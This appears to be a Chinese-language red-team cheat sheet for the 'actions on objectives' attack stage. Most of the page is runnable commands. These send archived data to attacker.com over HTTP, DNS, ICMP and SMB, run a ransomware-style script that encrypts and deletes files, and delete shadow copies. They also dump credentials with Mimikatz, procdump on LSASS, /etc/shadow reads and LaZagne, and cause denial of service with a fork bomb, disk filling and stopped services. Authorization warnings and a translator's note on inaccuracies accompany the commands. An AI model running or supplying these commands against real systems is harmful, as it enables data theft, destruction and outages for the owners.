# 🎯 阶段 7：达成攻击目标（Actions on Objectives）

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./07-Actions-Objectives.tr.md) • [🇬🇷 Ελληνικά](./07-Actions-Objectives.el.md)

```
   █████╗  ██████╗████████╗██╗ ██████╗ ███╗   ██╗███████╗     ██████╗ ███╗   ██╗
  ██╔══██╗██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝    ██╔═══██╗████╗  ██║
  ███████║██║        ██║   ██║██║   ██║██╔██╗ ██║███████╗    ██║   ██║██╔██╗ ██║
  ██╔══██║██║        ██║   ██║██║   ██║██║╚██╗██║╚════██║    ██║   ██║██║╚██╗██║
  ██║  ██║╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║███████║    ╚██████╔╝██║ ╚████║
  ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═════╝ ╚═╝  ╚═══╝
         ██████╗ ██████╗      ██╗███████╗ ██████╗████████╗██╗██╗   ██╗███████╗███████╗
        ██╔═══██╗██╔══██╗     ██║██╔════╝██╔════╝╚══██╔══╝██║██║   ██║██╔════╝██╔════╝
        ██║   ██║██████╔╝     ██║█████╗  ██║        ██║   ██║██║   ██║█████╗  ███████╗
        ██║   ██║██╔══██╗██   ██║██╔══╝  ██║        ██║   ██║╚██╗ ██╔╝██╔══╝  ╚════██║
        ╚██████╔╝██████╔╝╚█████╔╝███████╗╚██████╗   ██║   ██║ ╚████╔╝ ███████╗███████║
         ╚═════╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝╚══════╝
```

**目标：** 实现最终目标，例如数据外传、破坏或其他影响。

> **译注（示例含义）：** 标注“Base64 via GET”的示例使用 `curl -d`，实际发出 POST。`net user administrator ...` 只修改指定账户，而非所有用户。`vssadmin resize shadowstorage` 调整卷影存储上限，并不等于禁用卷影副本功能；缩容可能使现有副本消失，参见 [Microsoft 命令说明](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin-resize-shadowstorage)。加密模拟会删除源文件；示例按文本读取及写出数据，不能视为适用于任意文件的可靠加密流程。DNS、HTTP 和 SMB 的可达性与监控情况均取决于环境，表格不是通用保证。

---

## 📤 数据外传（Exfiltration）

### 查找敏感数据

#### Windows
```cmd
# 搜索敏感文件
dir /s /b *password* *credential* *secret* *.kdbx *.key
dir /s /b *.doc* *.xls* *.pdf *.txt *.config

# 查找最近修改的文件
forfiles /P C:\ /S /D +01/01/2024 /C "cmd /c echo @path"

# PowerShell：按内容搜索
Get-ChildItem -Recurse | Select-String -Pattern "password" -List | Select Path
Get-ChildItem -Path C:\ -Include *.txt,*.doc*,*.xls* -Recurse -ErrorAction SilentlyContinue
```

#### Linux
```bash
# 搜索敏感文件
find / -name "*password*" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password"

# 最近修改的文件
find / -mtime -7 -type f 2>/dev/null

# 大文件
find / -size +100M -type f 2>/dev/null
```

### 压缩数据并准备传输

#### Windows
```powershell
# PowerShell：创建 ZIP
Compress-Archive -Path C:\Sensitive -DestinationPath C:\temp\data.zip

# 7-Zip
7z a -p"password" data.7z C:\Sensitive\*

# 使用 tar 压缩
tar -cvzf data.tar.gz C:\Sensitive\
```

#### Linux
```bash
# 创建压缩归档
tar -cvzf /tmp/data.tar.gz /home/user/sensitive/

# 进行加密
tar -cvzf - /sensitive | openssl enc -aes-256-cbc -e > data.tar.gz.enc

# 带密码的 ZIP
zip -r -e data.zip /sensitive/
```

### 数据外传方法

#### HTTP/HTTPS
```bash
# 通过 curl 上传
curl -X POST -F "file=@/tmp/data.zip" http://attacker.com/upload.php

# 原文标注为通过 GET 传输 Base64（少量数据）；见译注
base64 /tmp/data.zip | curl -d @- http://attacker.com/receive

# PowerShell 上传
$bytes = [IO.File]::ReadAllBytes("C:\temp\data.zip")
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -Body $bytes
```

#### DNS 数据外传
```bash
# 将数据编码进 DNS 查询
cat /tmp/data | xxd -p | while read line; do nslookup $line.attacker.com; done

# 使用 dnscat2
dnscat2 attacker.com

# DNSExfiltrator
python dnsexfiltrator.py -d attacker.com -f data.zip
```

#### ICMP
```bash
# 通过 ping 外传数据
xxd -p -c 4 data.zip | while read line; do ping -c 1 -p $line attacker.com; done

# 使用 icmpsh
python icmpsh_m.py ATTACKER_IP VICTIM_IP
```

#### SMB
```bash
# 复制到攻击机共享目录
copy C:\Sensitive\data.zip \\attacker_ip\share\

# 挂载并复制（Linux；此处使用 smbclient 上传）
smbclient //attacker_ip/share -U user -c "put data.zip"
```

#### 云服务
```bash
# AWS S3
aws s3 cp data.zip s3://bucket-name/

# Azure Blob
az storage blob upload --file data.zip --container-name mycontainer --name data.zip

# Google Cloud
gsutil cp data.zip gs://bucket-name/
```

---

## 💣 破坏性操作（勒索软件模拟）

> ⚠️ **警告：** 仅用于获得授权的红队测试！

### 加密模拟
```powershell
# PowerShell：加密文件（模拟）
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789ABCDEF")
$files = Get-ChildItem -Path C:\TestData -Recurse -File
foreach ($file in $files) {
    $content = Get-Content $file.FullName -Raw
    $encrypted = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($content), $key, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    Set-Content "$($file.FullName).encrypted" $encrypted
    Remove-Item $file.FullName
}
```

### 删除卷影副本
```cmd
# 删除卷影副本（妨碍恢复）
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

# 原文标注为禁用卷影副本；见译注
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB
```

---

## 🔐 凭据收集

### Windows 凭据
```powershell
# Mimikatz：所有凭据
mimikatz# sekurlsa::logonpasswords

# 导出 SAM 数据库
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
mimikatz# lsadump::sam /sam:SAM /system:SYSTEM

# LSASS 转储
procdump -ma lsass.exe lsass.dmp
mimikatz# sekurlsa::minidump lsass.dmp

# 从转储中提取
pypykatz lsa minidump lsass.dmp
```

### Linux 凭据
```bash
# shadow 文件
cat /etc/shadow

# SSH 密钥
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# 历史记录文件
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# 配置文件
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
```

### 浏览器凭据
```bash
# Chrome 凭据（Windows）
# 位置：%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Firefox 凭据（Windows）
# 位置：%APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json

# LaZagne：所有浏览器密码
python laZagne.py all
```

---

## 🖥️ 系统影响

### 拒绝服务（DoS）
```bash
# Fork 炸弹（Linux）：不要运行！
:(){ :|:& };:

# 填满磁盘
dd if=/dev/zero of=/tmp/fill bs=1M count=100000

# 耗尽 CPU 资源
yes > /dev/null &
```

### 账户操纵
```bash
# 原文标注为更改所有用户密码；此命令仅针对 administrator
net user administrator NewP@ssw0rd!

# 禁用账户
net user username /active:no

# 删除用户
net user username /delete
```

### 服务中断
```cmd
# 停止关键服务
net stop "DNS Server"
net stop "Active Directory Domain Services"

# 禁用服务
sc config wuauserv start= disabled
```

---

## 📊 快速参考

### 数据外传方法

| 方法 | 优点 | 缺点 |
|--------|------|------|
| HTTP/HTTPS | 流量常见；HTTPS 提供加密 | 可能受到监控 |
| DNS | 原文认为通常未受监控 | 速度慢、存在大小限制 |
| ICMP | 可能穿过某些防火墙策略 | 速度很慢 |
| SMB | 速度快、系统原生支持 | 原文以内部网络场景为主 |
| 云服务 | 合法服务 | 需要凭据 |

### 数据位置优先级

| 位置 | 价值 |
|----------|-------|
| 域控制器 | 最高：AD 凭据 |
| 文件服务器 | 高：文档 |
| 邮件服务器 | 高：通信数据 |
| 数据库服务器 | 高：业务数据 |
| 开发服务器 | 中：源代码 |
| 用户工作站 | 中：本地文件 |

---

## ✅ 渗透测试报告检查清单

```markdown
- [ ] 记录所有已入侵系统
- [ ] 列出所有发现的凭据
- [ ] 绘制从初始访问开始的攻击路径
- [ ] 记录已利用的漏洞
- [ ] 记录发现的敏感数据位置
- [ ] 提供修复建议
- [ ] 附上活动时间线
- [ ] 截图保留访问证据
```

---

## 🔗 相关速查表

- [Mimikatz](../../Mimikatz/README.md)
- [Linux 命令](../../Linux-Commands/README.md)
- [PowerShell](../../PowerShell/README.md)

---

**上一阶段：** [← 06 - 防御规避](./06-Defense-Evasion.zh-CN.md)

**返回概览：** [🎯 攻击链概览](./README.zh-CN.md)

---

<p align="center">
  <b>🎯 任务完成！</b><br>
  <i>请记住：只有获得适当授权后才能执行这些操作！</i>
</p>
